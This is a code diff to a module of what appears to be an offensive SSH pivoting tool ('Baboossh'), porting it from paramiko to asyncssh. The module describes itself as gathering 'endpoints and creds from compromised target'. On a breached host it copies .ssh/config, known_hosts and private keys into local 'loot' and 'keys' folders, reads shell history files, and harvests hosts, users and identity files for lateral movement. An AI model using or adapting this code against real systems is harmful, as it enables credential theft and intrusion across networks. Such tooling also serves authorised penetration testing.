@@ -5,20 +5,12 @@ import glob
 import ipaddress
 import json
 import subprocess
+import asyncio, asyncssh
 from src.endpoint import Endpoint
 from src.user import User
 from src.path import Path
 from src.creds import Creds
 from src.connection import Connection
-from paramiko.rsakey import RSAKey
-from paramiko.ecdsakey import ECDSAKey
-from paramiko.dsskey import DSSKey
-from paramiko.ssh_exception import *
-
-#TODO implement those
-'''
-
-'''
 
 class ExtStr(type):
     def __str__(self):
@@ -44,30 +36,30 @@ class BaboosshExt(object,metaclass=ExtStr):
         return "Gather endpoints and creds from compromised target"
     
     @classmethod
-    def run(cls,socket, connection, wspaceFolder):
+    async def run(cls,socket, connection, wspaceFolder):
         g = cls(socket,connection, wspaceFolder)
         try:
-            g.gather()
+            await g.gather()
         except Exception as e:
             print("Error : "+str(e))
             return False
         return True
     
-    def gather(self):
-        self.gatherFromConfig()
-        historyFiles = self.listHistoryFiles()
+    async def gather(self):
+        await self.gatherFromConfig()
+        historyFiles = await self.listHistoryFiles()
         for historyFile in historyFiles:
-            self.gatherFromHistory(historyFile)
-        self.gatherKeys()
-        self.gatherFromKnown()
+            await self.gatherFromHistory(historyFile)
+        await self.gatherKeys()
+        await self.gatherFromKnown()
 
-    def hostnameToIP(self,hostname,port=None):
+    async def hostnameToIP(self,hostname,port=None):
         endpoints = []
         #Check if hostname is IP or Hostname :
         try:
             ipaddress.ip_address(hostname)
         except ValueError:
-            res = self.socket.run("getent hosts "+hostname+" | awk '{ print $1 }'",hide=True)
+            res = await self.socket.run("getent hosts "+hostname+" | awk '{ print $1 }'")
             ips = res.stdout.splitlines()
             for ip in ips:
                 endpoint = Endpoint(ip,port if port is not None else 22)
@@ -83,12 +75,12 @@ class BaboosshExt(object,metaclass=ExtStr):
             endpoints.append(endpoint)
         return endpoints
 
-    def gatherFromConfig(self):
+    async def gatherFromConfig(self):
         lootFolder = os.path.join(self.wspaceFolder,"loot")
-        filename = str(self.connection.getEndpoint())+"_"+str(self.connection.getUser())+"_.ssh_config"
+        filename = str(self.connection.getEndpoint()).replace(":","-")+"_"+str(self.connection.getUser())+"_.ssh_config"
         filepath = os.path.join(lootFolder,filename)
         try:
-            self.socket.get(".ssh/config",filepath)
+            await asyncssh.scp((self.socket,".ssh/config"),filepath)
         except Exception as e:
             return None
         with open(filepath,'r',errors='replace') as f:
@@ -111,7 +103,7 @@ class BaboosshExt(object,metaclass=ExtStr):
                         port = curHost["port"]
                     else:
                         port=None
-                    endpoints = self.hostnameToIP(host,port)
+                    endpoints = await self.hostnameToIP(host,port)
                     nbEndpoints = nbEndpoints + len(endpoints)
                     user = None
                     identity = None
@@ -120,7 +112,7 @@ class BaboosshExt(object,metaclass=ExtStr):
                         user.save()
                         nbUsers = nbUsers + 1
                     if "identity" in curHost.keys():
-                        identity = self.getKeyToCreds(curHost["identity"],".")
+                        identity = await self.getKeyToCreds(curHost["identity"],".")
                         if identity != None:
                             nbCreds = nbCreds+1
                     if user is not None and identity is not None:
@@ -149,7 +141,7 @@ class BaboosshExt(object,metaclass=ExtStr):
                 port = curHost["port"]
             else:
                 port=None
-            endpoints = self.hostnameToIP(host,port)
+            endpoints = await self.hostnameToIP(host,port)
             nbEndpoints = nbEndpoints + len(endpoints)
             user = None
             identity = None
@@ -158,7 +150,7 @@ class BaboosshExt(object,metaclass=ExtStr):
                 user.save()
                 nbUsers = nbUsers + 1
             if "identity" in curHost.keys():
-                identity = self.getKeyToCreds(curHost["identity"],".")
+                identity = await self.getKeyToCreds(curHost["identity"],".")
                 if identity != None:
                     nbCreds = nbCreds+1
             if user is not None and identity is not None:
@@ -167,12 +159,12 @@ class BaboosshExt(object,metaclass=ExtStr):
                     conn.save()
         print("Found "+str(nbEndpoints)+" enpoints, "+str(nbUsers)+" users and "+str(nbCreds)+" creds in config file")
 
-    def gatherFromKnown(self):
+    async def gatherFromKnown(self):
         lootFolder = os.path.join(self.wspaceFolder,"loot")
-        filename = str(self.connection.getEndpoint())+"_"+str(self.connection.getUser())+"_.ssh_known_hosts"
+        filename = str(self.connection.getEndpoint()).replace(':','-')+"_"+str(self.connection.getUser())+"_.ssh_known_hosts"
         filepath = os.path.join(lootFolder,filename)
         try:
-            self.socket.get(".ssh/known_hosts",filepath)
+            await asyncssh.scp((self.socket,".ssh/known_hosts"),filepath)
         except Exception as e:
             return None
         with open(filepath,'r',errors='replace') as f:
@@ -185,32 +177,33 @@ class BaboosshExt(object,metaclass=ExtStr):
                 continue
             targets = line.partition(' ')[0]
             for target in targets.split(','):
-                endpoints = endpoints + self.hostnameToIP(target)
+                endpoints = endpoints + await self.hostnameToIP(target)
         print("Found "+str(len(endpoints))+" hosts in known_hosts")
 
-    def gatherKeys(self):
+    async def gatherKeys(self):
         files = []
         ret = []
-        result = self.socket.run("ls -A .ssh",hide=True)
+        result = await self.socket.run("ls -A .ssh")
         for line in result.stdout.splitlines():
             if "rsa" in line or "key" in line or "p12" in line or "dsa" in line:
                 files.append(line)
         for keyfile in files:
-            c = self.getKeyToCreds(keyfile)
+            c = await self.getKeyToCreds(keyfile)
             if c != None:
                 ret.append(c)
         print("Found "+str(len(ret))+" private keys")
 
-    def getKeyToCreds(self,keyfile,basePath=".ssh"):
+    async def getKeyToCreds(self,keyfile,basePath=".ssh"):
         if basePath != ".":
             keyfile = os.path.join(basePath,keyfile)
         from src.params import Extensions
         keysFolder = os.path.join(self.wspaceFolder,"keys")
-        filename = str(self.connection.getEndpoint())+"_"+str(self.connection.getUser())+"_"+keyfile.replace("/","_")
+        filename = str(self.connection.getEndpoint()).replace(":","-")+"_"+str(self.connection.getUser())+"_"+keyfile.replace("/","_")
         filepath = os.path.join(keysFolder,filename)
         try:
-            self.socket.get(keyfile,filepath)
+            await asyncssh.scp((self.socket,keyfile),filepath)
         except Exception as e:
+            print(e)
             return None
         subprocess.run(["chmod","600",filepath])
         valid,haspass = Extensions.getAuthMethod("privkey").checkKeyfile(filepath)
@@ -223,16 +216,16 @@ class BaboosshExt(object,metaclass=ExtStr):
             os.remove(filepath)
         return None
 
-    def listHistoryFiles(self):
+    async def listHistoryFiles(self):
         ret = []
-        result = self.socket.run("ls -A",hide=True)
+        result = await self.socket.run("ls -A")
         for line in result.stdout.splitlines():
             if "history" in line:
                 ret.append(line)
         return ret
 
-    def gatherFromHistory(self,historyFile):
-        result = self.socket.run("cat "+historyFile,hide=True)
+    async def gatherFromHistory(self,historyFile):
+        result = await self.socket.run("cat "+historyFile)
         lines = result.stdout.splitlines()
         nbEndpoints = 0
         nbUsers = 0
@@ -268,14 +261,14 @@ class BaboosshExt(object,metaclass=ExtStr):
                         host = True
                 if not host:
                     continue
-                endpoints = self.hostnameToIP(hostname,port)
+                endpoints = await self.hostnameToIP(hostname,port)
                 nbEndpoints = nbEndpoints + len(endpoints)
                 if user is not None:
                     user = User(user)
                     user.save()
                     nbUsers = nbUsers + 1
                 if identity is not None:
-                    identity = self.getKeyToCreds(identity,".")
+                    identity = await self.getKeyToCreds(identity,".")
                     if identity != None:
                         nbCreds = nbCreds+1
                 if user is not None and identity is not None:
